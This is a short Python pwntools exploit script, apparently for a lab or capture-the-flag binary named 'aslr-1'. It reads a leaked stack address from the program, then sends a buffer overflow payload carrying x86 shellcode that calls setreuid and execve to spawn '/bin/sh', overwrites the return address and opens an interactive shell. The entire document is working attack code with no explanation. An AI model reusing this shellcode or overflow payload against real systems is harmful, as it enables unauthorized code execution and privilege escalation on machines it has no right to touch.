#!/usr/bin/env python

from pwn import *

# create process and run the program
p = process("./aslr-1")

string = p.recv()
string_buffer_start = string[18:28]
print("STINRG: "+ string)
buffer_start_addr = p32(int(string_buffer_start, 16))
shell_code = "j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xc91\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80"

buff = "AAAA" + shell_code + ("B"*(0x88 - 0x4 - len(shell_code))) + "BBBB" + buffer_start_addr
# send data with newline
p.sendline(buff)

# open an interactive console to the program
p.interactive()
